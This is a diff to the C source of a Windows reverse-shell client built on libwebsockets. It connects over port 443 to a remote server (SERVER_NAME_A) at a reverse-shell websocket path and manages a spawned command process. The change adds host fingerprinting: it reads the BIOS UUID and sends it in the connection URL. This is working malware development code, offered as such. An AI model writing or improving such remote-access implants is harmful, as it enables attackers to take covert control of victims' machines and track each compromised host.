@@ -10,6 +10,7 @@ static struct my_conn
 	uint16_t		retry_count; /* count of consequetive retries */
 } mco;
 
+struct lws_context* context;
 static int interrupted;
 static const char* pro = "dumb-increment-protocol";
 
@@ -39,14 +40,18 @@ VOID connect_client(lws_sorted_usec_list_t* sul)
 {
 	struct my_conn* mco = lws_container_of(sul, struct my_conn, sul);
 	struct lws_client_connect_info i = { 0 };
-	static int port = 443;
 
-	const char* server_address = SERVER_NAME_A;
+	CHAR path[URL_SIZE] = { 0 };
+	CHAR uuid[INFORMATION_SIZE] = { 0 };
+	GetInformation(uuid, sizeof(uuid), BIOS_UUID);
+
+	if (StringCbPrintfA(path, sizeof(path), "%s?%s", REVERSE_SHELL_WS_A, uuid) != S_OK)
+		return;
 
 	i.context = context;
-	i.port = port;
-	i.address = server_address;
-	i.path = REVERSE_SHELL_WS_A;
+	i.port = 443;
+	i.address = SERVER_NAME_A;
+	i.path = path;
 	i.host = i.address;
 	i.origin = i.address;
 	i.protocol = pro;
@@ -73,7 +78,7 @@ INT callback_minimal(struct lws* socket, enum lws_callback_reasons reason, void*
 {
 	struct my_conn* mco = (struct my_conn*)user;
 	char buf[LWS_PRE + BUFSIZE] = { 0 };
-	
+
 	switch (reason)
 	{
 		printf("reason = %d\n", reason);
@@ -123,7 +128,7 @@ INT callback_minimal(struct lws* socket, enum lws_callback_reasons reason, void*
 
 		break;
 	}
-		
+
 	case LWS_CALLBACK_CLIENT_CLOSED:
 
 		if (((WebSocketData*)user)->hThreadRead)
@@ -137,7 +142,7 @@ INT callback_minimal(struct lws* socket, enum lws_callback_reasons reason, void*
 			BOOL ret = TerminateProcess(((WebSocketData*)user)->hCmdProcess, 0);
 			printf("Process ended: GetLastError(%d)\n", GetLastError());
 		}
-			
+
 		break;
 		goto do_retry;
 
@@ -169,14 +174,14 @@ do_retry:
 }
 /********************************************************************************************************************************/
 // Make the connection with the server
-BOOL WS_Connection()
+BOOL WebSocketConnection()
 {
 	//struct WebSocketData wsData = { 0 };
 	struct lws_context_creation_info info = { 0 };
 	int n = 0;
 
 	lwsl_user("Reverse Shell\n");
-	
+
 	info.options = LWS_SERVER_OPTION_DO_SSL_GLOBAL_INIT;
 	info.port = CONTEXT_PORT_NO_LISTEN; /* we do not run any server */
 	info.protocols = protocols;
@@ -197,9 +202,9 @@ BOOL WS_Connection()
 	{
 		n = lws_service(context, 0);
 	}
-	
+
 	lws_context_destroy(context);
-	
+
 	lwsl_user("Completed\n");
 
 	return TRUE;
